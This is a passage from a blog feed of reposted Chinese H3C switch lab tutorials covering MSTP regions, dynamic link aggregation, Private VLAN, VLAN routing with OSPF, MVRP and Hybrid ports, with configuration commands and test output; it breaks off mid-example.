只有一台交换机，所以无需手动配置主备根网桥</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[SW7]stp region-configuration</span><br><span class="line">[SW7-mst-region]region-name h3c3</span><br><span class="line">[SW7-mst-region]revision-level 1</span><br><span class="line">[SW7-mst-region]instance 1 vlan 20</span><br><span class="line">[SW7-mst-region]instance 2 vlan 40</span><br><span class="line">[SW7-mst-region]active region-configuration</span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链路聚合实验-动态</title>
      <link href="/posts/43274"/>
      <url>/posts/43274</url>
      
        <content type="html"><![CDATA[<br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88%E5%AE%9E%E9%AA%8C-%E5%8A%A8%E6%80%81/01.jpg"><em>图1-1</em></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>I</strong>.<em>在 SW1 和 SW2 之间配置动态链路聚合，允许所有 VLAN 通过</em></p><p><strong>II</strong>.<em>要求 SW1 和 SW2 之间的最大传输带宽为 2G</em></p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p><strong>I.在 SW1 和 SW2 之间配置动态链路聚合</strong></p><p><em>步骤 1：在 SW1 上创建聚合接口，并把 G1&#x2F;0&#x2F;1，G1&#x2F;0&#x2F;2，G1&#x2F;0&#x2F;3 口加入聚合组</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface Bridge-Aggregation 1</span><br><span class="line">[SW1]interface g1/0/1</span><br><span class="line">[SW1-GigabitEthernet1/0/1]port link-aggregation group 1</span><br><span class="line">[SW1]interface g1/0/2</span><br><span class="line">[SW1-GigabitEthernet1/0/2]port link-aggregation group 1</span><br><span class="line">[SW1]interface g1/0/3</span><br><span class="line">[SW1-GigabitEthernet1/0/3]port link-aggregation group 1</span><br></pre></td></tr></table></figure><p><em>步骤 2：进入聚合接口，配置为动态模式</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface Bridge-Aggregation 1</span><br><span class="line">[SW1-Bridge-Aggregation1]link-aggregation mode dynamic </span><br></pre></td></tr></table></figure><p><em>步骤 3：在 SW2 上创建聚合接口，并把 G1&#x2F;0&#x2F;1，G1&#x2F;0&#x2F;2，G1&#x2F;0&#x2F;3 口加入聚合组，命令与 SW1 一致</em></p><p><em>步骤 4：在 SW1 的聚合接口中配置端口类型为 Trunk，并放行所有 VLAN</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[SW1-Bridge-Aggregation1]port link-type trunk </span><br><span class="line">Configuring GigabitEthernet1/0/1 done.</span><br><span class="line">Configuring GigabitEthernet1/0/2 done.</span><br><span class="line">Configuring GigabitEthernet1/0/3 done.</span><br><span class="line">[SW1-Bridge-Aggregation1]port trunk permit vlan all</span><br><span class="line">Configuring GigabitEthernet1/0/1 done.</span><br><span class="line">Configuring GigabitEthernet1/0/2 done.</span><br><span class="line">Configuring GigabitEthernet1/0/3 done.</span><br></pre></td></tr></table></figure><p><em>步骤 5：在 SW2 的聚合接口中配置端口类型为 Trunk，并放行所有 VLAN，命令与 SW1 一致</em></p><p><strong>II.要求 SW1 和 SW2 之间的最大传输带宽为 2G</strong></p><p>　　<em>分析：SW1 和 SW2 之间的链路聚合为 3 个千兆口组成，最大传输带宽有 3G，这里要求最大为 2G，也就是同时只允许选中 2 个聚合成员端口</em><br>　　<br><em>步骤 1：在 SW1 和 SW2 的聚合接口中，配置最大可用端口为 2 个</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SW1-Bridge-Aggregation1]link-aggregation selected-port maximum 2   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SW2-Bridge-Aggregation1]link-aggregation selected-port maximum 2</span><br></pre></td></tr></table></figure><p><em>效果测试：在 SW1 和 SW2 上查看链路聚合信息，发现被 G1&#x2F;0&#x2F;1 和 G1&#x2F;0&#x2F;2 口被选中，G1&#x2F;0&#x2F;3 未选中</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[SW1]dis link-aggregation verbose </span><br><span class="line"></span><br><span class="line">Port                Status  Priority Oper-Key  Flag</span><br><span class="line">    --------------------------------------------------------------------------------</span><br><span class="line">GE1/0/1             S       32768    1         &#123;ACDEF&#125;</span><br><span class="line">GE1/0/2             S       32768    1         &#123;ACDEF&#125;</span><br><span class="line">GE1/0/3             U       32768    1         &#123;ACD&#125;</span><br></pre></td></tr></table></figure><p><em>手动关闭 G1&#x2F;0&#x2F;1 口，链路聚合自动开启 G1&#x2F;0&#x2F;3 口</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SW1-GigabitEthernet1/0/1]shutdown </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[SW1]display link-aggregation verbose </span><br><span class="line"></span><br><span class="line">Port                Status  Priority Oper-Key  Flag</span><br><span class="line">    --------------------------------------------------------------------------------</span><br><span class="line">GE1/0/1             U       32768    1         &#123;AC&#125;</span><br><span class="line">GE1/0/2             S       32768    1         &#123;ACDEF&#125;</span><br><span class="line">GE1/0/3             S       32768    1         &#123;ACDEF&#125;</span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Private VLAN 实验</title>
      <link href="/posts/39120"/>
      <url>/posts/39120</url>
      
        <content type="html"><![CDATA[<br /><br /><h2 id="VLAN-扩展技术"><a href="#VLAN-扩展技术" class="headerlink" title="VLAN 扩展技术"></a>VLAN 扩展技术</h2><h3 id="Private-VLAN"><a href="#Private-VLAN" class="headerlink" title="Private VLAN"></a><em>Private VLAN</em></h3><p>定义：<code>私有VLAN，用于解决大规模园区网中，VLAN数量不够用的问题</code></p><p>原理：</p><ul><li><code>Primary VLAN链接上行设备</code></li><li><code>Secondary VLAN链接下行终端</code></li><li><code>上行接口为Hybrid类型，缺省VLAN为Primary VLAN,放行Primary VLAN和所有Secondary VLAN剥离Tag通过</code></li><li><code>下行接口为Hybrid类型，缺省VLAN为本地Secondary VLAN，放行Primary VLAN和本地Secondary VLAN剥离tag通过</code></li><li><code>对上行设备来说，Secondary VLAN不可见</code></li></ul><p>MAC地址同步技术：</p><ul><li><code>各Secondary VLAN学习的MAC地址自动同步到Primary VLAN</code></li><li><code>Primary VLAN学习的MAC地址会自动同步到各Secondary VLAN</code></li></ul><h3 id="Super-VLAN"><a href="#Super-VLAN" class="headerlink" title="Super VLAN"></a><em>Super VLAN</em></h3><p>定义：<code>超级VLAN，用于实现多个VLAN公用同一个IP网段，节省IP地址资源</code></p><p>原理：</p><ul><li><code>Super VLAN只建立三层接口，不包含物理接口</code></li><li><code>Super VLAN包含若干Sub VLAN，为Sub VLAN提供三层转发服务</code></li><li><code>Sub VLAN连接终端，保留各自独立广播域</code></li><li><code>所有Sub VLAN通过Super VLAN的三层接口与外部通讯</code></li><li><code>Sub VLAN间的三层互通通过代理ARP实现</code></li></ul><h2 id="Private-VLAN-实验"><a href="#Private-VLAN-实验" class="headerlink" title="Private VLAN 实验"></a>Private VLAN 实验</h2><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/Privatevlan%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>I</strong>.按照图示配置 IP 地址</p><p><strong>II</strong>.在 SW1 上配置 Private VLAN，Primary VLAN 为 Vlan30，Secondary VLAN 为 Vlan10 和 Vlan20</p><p><strong>III</strong>.SW2 通过 Vlan100 下行连接 SW1，要求 PC3 和 PC4 都能以 Vlan100 访问 PC5</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p><strong>I</strong>.<strong>配置 IP 地址部分略</strong></p><p><strong>II</strong>.<strong>在 SW1 上配置 Private VLAN，Primary VLAN 为 Vlan30，Secondary VLAN 为 Vlan10 和 Vlan20</strong></p><p>　　<em>分析：根据需求，通过配置 Private VLAN 来使 Secondary VLAN 对上行设备不可见，实现 VLAN 复用的效果<br>　　VLAN30 为 Prmary VLAN，Vlan10 和 Vlan20 为其 Secondary VLAN，把连接上行设备的接口 G1&#x2F;0&#x2F;3 口配置为上行接口，连接终端的 G1&#x2F;0&#x2F;1 和 G1&#x2F;0&#x2F;2 口配置为客户端接口</em></p><p><em>步骤 1：在 SW1 上创建 Vlan10，Vlan20，Vlan30</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW1]vlan 10</span><br><span class="line">[SW1]vlan 20</span><br><span class="line">[SW1]vlan 30</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 SW1 上配置 Vlan30 为 Prmary VLAN，Secondary VLAN 为 Vlan10 和 Vlan20</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1-vlan30]private-vlan primary </span><br><span class="line">[SW1-vlan30]private-vlan secondary 10 20</span><br></pre></td></tr></table></figure><p><em>步骤 3：在 SW1 上配置 G1&#x2F;0&#x2F;3 口为上行接口，G1&#x2F;0&#x2F;1 和 G1&#x2F;0&#x2F;2 口为下行接口，并把 G1&#x2F;0&#x2F;1 口加入 Vlan10，把 G1&#x2F;0&#x2F;2 口加入 Vlan20</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[SW1-GigabitEthernet1/0/3]port private-vlan 30 promiscuous</span><br><span class="line">[SW1-GigabitEthernet1/0/1]port access vlan 10</span><br><span class="line">[SW1-GigabitEthernet1/0/1]port private-vlan host </span><br><span class="line">[SW1-GigabitEthernet1/0/2]port access vlan 20</span><br><span class="line">[SW1-GigabitEthernet1/0/2]port private-vlan host </span><br></pre></td></tr></table></figure><p><strong>III</strong>.<strong>SW2 通过 Vlan100 下行连接 SW1，要求 PC3 和 PC4 都能以 Vlan100 访问 PC5</strong></p><p>　　<em>分析：根据 Private VLAN 原理，SW1 向 G1&#x2F;0&#x2F;3 接口发出的所有 Vlan 的数据帧都将剥离 tag 发出，SW2 收到的必定是未携带 tag 的数据帧，把 SW2 的 G1&#x2F;0&#x2F;2 和 G1&#x2F;0&#x2F;2 口都以 Access 类型加入 Vlan100，SW2 就会把收到的 SW1 转发过来的数据帧重新打上 Vlan 100 的 tag，从而实现 PC3 和 PC4 都能够以 Vlan100 访问 PC5</em><br>　　<br><em>步骤 1：在 SW2 上创建 Vlan100，并把 G1&#x2F;0&#x2F;1 和 G1&#x2F;0&#x2F;2 口以 Access 类型加入 Vlan100</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW2]vlan 100</span><br><span class="line">[SW2-vlan100]port g1/0/1</span><br><span class="line">[SW2-vlan100]port g1/0/2</span><br></pre></td></tr></table></figure><p><em>效果测试：PC3 和 PC4 都能够 Ping 通 PC5</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;PC3&gt;ping 192.168.1.1</span><br><span class="line">Ping 192.168.1.1 (192.168.1.1): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=0 ttl=255 time=166.000 ms</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=1 ttl=255 time=58.000 ms</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=2 ttl=255 time=53.000 ms</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=3 ttl=255 time=67.000 ms</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=4 ttl=255 time=56.000 ms</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;PC4&gt;ping 192.168.1.1</span><br><span class="line">Ping 192.168.1.1 (192.168.1.1): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=0 ttl=255 time=166.000 ms</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=1 ttl=255 time=58.000 ms</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=2 ttl=255 time=53.000 ms</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=3 ttl=255 time=67.000 ms</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=4 ttl=255 time=56.000 ms</span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vlan路由实验</title>
      <link href="/posts/36101"/>
      <url>/posts/36101</url>
      
        <content type="html"><![CDATA[<br /><br /><h2 id="VLAN路由"><a href="#VLAN路由" class="headerlink" title="VLAN路由"></a>VLAN路由</h2><p><em>精确匹配转发</em></p><p><code>原理</code></p><ul><li><code>对数据包进行一次路由查表后，生成具体目的地址的转发表项</code></li><li><code>后续报文直接根据此表项进行精确匹配转发</code></li></ul><p><code>缺点对每个目的IP生成转发表项，表项规模庞大</code></p><p><em>最长匹配转发</em></p><p><code>原理</code></p><ul><li><code>基于硬件的最长匹配的三层交换技术</code></li><li><code>所有报文的转发都通过硬件快速匹配完成转发</code></li></ul><h2 id="VLAN路由实验"><a href="#VLAN路由实验" class="headerlink" title="VLAN路由实验"></a>VLAN路由实验</h2><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/Vlan%E8%B7%AF%E7%94%B1%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>I</strong>.按照图示创建 Vlan，所有接口配置为 Access 类型加入相应互联 VLAN</p><p><strong>II</strong>.按照图示配置 IP 地址</p><p><strong>III</strong>.配置 OSPF，实现全网互通</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>I.<strong>按照图示创建 Vlan，所有接口配置为 Access 类型加入响应互联 VLAN</strong></p><p>　　<em>分析：根据需求，每台交换机上只需要创建本端的互联 VLAN 即可，并把相应接口加入到对应的互联 VLAN。如果接口配置为 Trunk 的话，可能会造成 Vlan1 和其他 Vlan 存在环路而被 STP 阻塞端口，导致路由不通</em><br>　　<br><em>步骤 1：在 SW1 上创建 Vlan10 和 Vlan20，G1&#x2F;0&#x2F;1 口加入到 Vlan20，G1&#x2F;0&#x2F;2 口加入到 Vlan10。命令略</em></p><p><em>步骤 2：在 SW2 上创建 Vlan10 和 Vlan30，G&#x2F;0&#x2F;1 口加入到 Vlan30，G1&#x2F;0&#x2F;2 口加入到 Vlan10。命令略</em></p><p><em>步骤 3：在 SW3 上创建 Vlan20 和 Vlan40，G&#x2F;0&#x2F;1 口加入到 Vlan20，G1&#x2F;0&#x2F;2 口加入到 Vlan40。命令略</em></p><p><em>步骤 4：在 SW4 上创建 Vlan30 和 Vlan40，G&#x2F;0&#x2F;1 口加入到 Vlan30，G1&#x2F;0&#x2F;2 口加入到 Vlan40。命令略</em></p><p>II.<strong>按照图示配置 IP 地址</strong></p><p><em>步骤 1：创建 Vlan10 和 Vlan20 的三层接口，并配置 IP 地址</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface Vlan-interface 10</span><br><span class="line">[SW1-Vlan-interface10]ip address 100.1.1.1 24</span><br><span class="line">[SW1]interface Vlan-interface 20</span><br><span class="line">[SW1-Vlan-interface20]ip address 100.2.2.1 24</span><br></pre></td></tr></table></figure><p><em>步骤 2：SW2，SW3，SW4 配置方法同 SW1，步骤略</em></p><p>III.<strong>配置 OSPF，实现全网互通</strong></p><p><em>步骤 1：在 SW1 上配置 OSPF</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[SW1]ospf router-id 1.1.1.1</span><br><span class="line">[SW1-ospf-1]area 0</span><br><span class="line">[SW1-ospf-1-area-0.0.0.0]network 100.1.1.0 0.0.0.255</span><br><span class="line">[SW1-ospf-1-area-0.0.0.0]network 100.2.2.0 0.0.0.255</span><br><span class="line">[SW1-ospf-1-area-0.0.0.0]network 1.1.1.1 0.0.0.0</span><br></pre></td></tr></table></figure><p><em>步骤 2：SW2，SW3，SW4 配置 OSPF 方法同 SW1，步骤略</em></p><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MVRP实验</title>
      <link href="/posts/39406"/>
      <url>/posts/39406</url>
      
        <content type="html"><![CDATA[<br /><h3 id="VLAN信息传播"><a href="#VLAN信息传播" class="headerlink" title="VLAN信息传播"></a>VLAN信息传播</h3><h4 id="MVRP协议"><a href="#MVRP协议" class="headerlink" title="MVRP协议"></a>MVRP协议</h4><p><em>定义</em></p><ul><li><code>多VLAN注册协议</code></li><li><code>用于交换机之间动态学习VLAN信息</code></li></ul><p><em>注意点</em></p><ul><li><code>MVRP会沿MSTP树单向传播到整个二层网络中</code></li><li><code>只能用于传播VLAN信息本身，无法传播端口的VLAN信息</code></li><li><code>只有在创建某VLAN的交换机上，才能对该VLAN进行删除操作，无法对动态学习的VLAN进行删除</code></li><li><code>需要手动配置放行Trunk端口学习到的VLAN</code></li></ul><p><em>MVRP端口模式</em></p><ul><li><strong>Normal</strong>(普通)模式<ul><li><code>可传递和动态学习所有VLAN</code></li><li><code>端口MVRP默认模式是Normal模式</code></li></ul></li><li><strong>Fixed</strong>(固定)模式<ul><li><code>只传递VLAN1和静态VLAN，不动态学习VLAN</code></li></ul></li><li><strong>Forbidden</strong>(禁用)模式<ul><li><code>只传递VLAN1</code></li></ul></li></ul><h3 id="MVRP实验"><a href="#MVRP实验" class="headerlink" title="MVRP实验"></a>MVRP实验</h3><h4 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h4><p><img src="/images/MVRP%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>I</strong>.所有交换机相连的接口配置为 Trunk 类型，并放行所有 Vlan</p><p><strong>II</strong>.所有端口开启 MVRP，要求 SW1 只传递本机上创建的 Vlan，但不学习其他交换机上的 Vlan 信息，SW2 和 SW3 都可以动态学习和传递 Vlan 信息</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>I.<strong>配置接口 Trunk 类型步骤略</strong></p><p>II.<strong>所有端口开启 MVRP，要求 SW1 只传递本机上创建的 Vlan，但不学习其他交换机上的 Vlan 信息，SW2 和 SW3 都可以动态学习和传递 Vlan 信息</strong></p><p>　　<em>分析：根据需求，所有交换机开启 MVRP。MVRP 需要首先在系统视图下全局开启，再到接口开启<br>　　要求 SW1 只传递本机上创建的 Vlan 信息，但不学习其他交换机上的 Vlan 信息，把 SW2 的 G1&#x2F;0&#x2F;1 口配置为 Fixed 模式即可<br>　　SW2 和 SW3 都可以动态学习和传递 Vlan 信息，所以 SW2 和 SW3 的端口 MVRP 模式保持默认的模式 Normal 即可</em></p><p><em>步骤 1：在 SW1 上全局开启 MVRP，在 G1&#x2F;0&#x2F;1 接口上开启 MVRP，并配置 G1&#x2F;0&#x2F;1 口的 MVRP 模式为 Fixed</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]mvrp global enable</span><br><span class="line">[SW1]interface g1/0/1</span><br><span class="line">[SW1-GigabitEthernet1/0/1]mvrp enable</span><br><span class="line">[SW1-GigabitEthernet1/0/1]mvrp registration fixed</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 SW2 和 SW3 上全局开启 MVRP，并在 G1&#x2F;0&#x2F;1 和 G1&#x2F;0&#x2F;2 口上开启 MVRP</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[SW2]mvrp global enable</span><br><span class="line">[SW2]interface g1/0/1</span><br><span class="line">[SW2-GigabitEthernet1/0/1]mvrp enable</span><br><span class="line">[SW2]interface g1/0/2</span><br><span class="line">[SW2-GigabitEthernet1/0/2]mvrp enable</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW3]mvrp global enable</span><br><span class="line">[SW3]interface g1/0/1</span><br><span class="line">[SW3-GigabitEthernet1/0/1]mvrp enable</span><br></pre></td></tr></table></figure><p>III.<strong>效果测试</strong></p><p><em>步骤 1：在 SW1 上创建 Vlan10，发现 SW2 和 SW3 都可以动态学习</em></p><p><em>步骤 2：在 SW3 上创建 Vlan20，发现 SW2 可以动态学习，但 SW1 没有学习</em></p><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hybrid实验</title>
      <link href="/posts/6951"/>
      <url>/posts/6951</url>
      
        <content type="html"><![CDATA[<br /><h2 id="Hybrid端口类型"><a href="#Hybrid端口类型" class="headerlink" title="Hybrid端口类型"></a>Hybrid端口类型</h2><ul><li><p>接受<code>未携带tag的帧会打上缺省VLAN的tag</code></p></li><li><p>发送</p><ul><li><p><code>untagged列表中的VLAN，剥离tag转发</code></p></li><li><p><code>tagged列表中的VLAN，保留tag转发</code></p></li><li><p><code>其他VLAN不予放行</code></p></li></ul></li></ul><h1 id="Hybrid-实验"><a href="#Hybrid-实验" class="headerlink" title="Hybrid 实验"></a>Hybrid 实验</h1><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/Hybrid%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>1）按照图示配置 IP 地址</p><p>2）PC2 属于 Vlan10，PC3 属于 Vlan20，PC4 属于 Vlan30</p><p>3）要求通过配置接口类型为 Hybrid，实现 Vlan20 和 Vlan30 都可以访问 Vlan10，但是 Vlan20 和 Vlan30 之间不能互相访问</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>1）<strong>配置 IP 地址部分略</strong></p><p>2）<strong>PC2 属于 Vlan10，PC3 属于 Vlan20，PC4 属于 Vlan30，且要求通过配置接口类型为 Hybrid，实现 Vlan20 和 Vlan30 都可以访问 Vlan10，但是 Vlan20 和 Vlan30 之间不能互相访问</strong></p><p>　　<em>分析：要求通过配置接口类型为 Hybrid 来实现 Vlan20 和 Vlan30 都可以访问 Vlan10，但是 Vlan20 和 Vlan30 之间不能互相访问。<br>　　3 台 PC 属于不同 Vlan，要实现二层中的互通，可以使用 Hybrid，根据需求，连接 PC2 的 G1&#x2F;0&#x2F;1 口配置 Pvid 为 10，并放行 Vlan10，Vlan20 和 Vlan30 剥离 tag，连接 PC3 的 G1&#x2F;0&#x2F;2 口 配置 Pvid 为 20，并放行 Vlan10 和 Vlan20 剥离 tag，连接 PC4 的 G1&#x2F;0&#x2F;2 口配置 pvid 为 30，并放行 Vlan10 和 Vlan 30 剥离 tag<br>　　由于连接 PC2 的端口放行了所有 3 个 Vlan，所以 PC3 和 PC4 都可以访问进来，但是连接 PC3 和 PC4 的端口只放行了 Vlan10 和本端缺省 Vlan，所以 PC3 和 PC4 之间无法互访</em></p><p><em>步骤 1：在 SW1 上创建 Vlan10，Vlan20，Vlan30</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW1]vlan 10</span><br><span class="line">[SW1]vlan 20</span><br><span class="line">[SW1]vlan 30</span><br></pre></td></tr></table></figure><p><em>步骤 2：配置 SW1 的 G1&#x2F;0&#x2F;1 口为 Hybrid 类型，Pvid 为 10，并放行Vlan10，Vlan20 和 Vlan30 剥离 tag</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g1/0/1</span><br><span class="line">[SW1-GigabitEthernet1/0/1]port link-type hybrid</span><br><span class="line">[SW1-GigabitEthernet1/0/1]port hybrid pvid vlan 10</span><br><span class="line">[SW1-GigabitEthernet1/0/1]port hybrid vlan 10 20 30 untagged </span><br></pre></td></tr></table></figure><p><em>步骤 3：配置 SW1 的 G1&#x2F;0&#x2F;2 口为 Hybrid 类型，Pvid 为 20，并放行Vlan10 和 Vlan20 剥离 tag</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g1/0/2</span><br><span class="line">[SW1-GigabitEthernet1/0/2]port link-type hybrid</span><br><span class="line">[SW1-GigabitEthernet1/0/2]port hybrid pvid vlan 20</span><br><span class="line">[SW1-GigabitEthernet1/0/2]port hybrid vlan 10 20 untagged</span><br></pre></td></tr></table></figure><p><em>步骤 4：配置 SW1 的 G1&#x2F;0&#x2F;3 口为 Hybrid 类型，Pvid 为 30，并放行Vlan10 和 Vlan30 剥离 tag</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g1/0/3</span><br><span class="line">[SW1-GigabitEthernet1/0/3]port link-type hybrid</span><br><span class="line">[SW1-GigabitEthernet1/0/3]port hybrid pvid vlan 30</span><br><span class="line">[SW1-GigabitEthernet1/0/3]port hybrid vlan 10 30 untagged</span><br></pre></td></tr></table></figure><p><em>效果测试：在 PC3 上可以 Ping 通 PC2，但无法 Ping 通 PC4，PC4 也可以 Ping 通 PC2</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 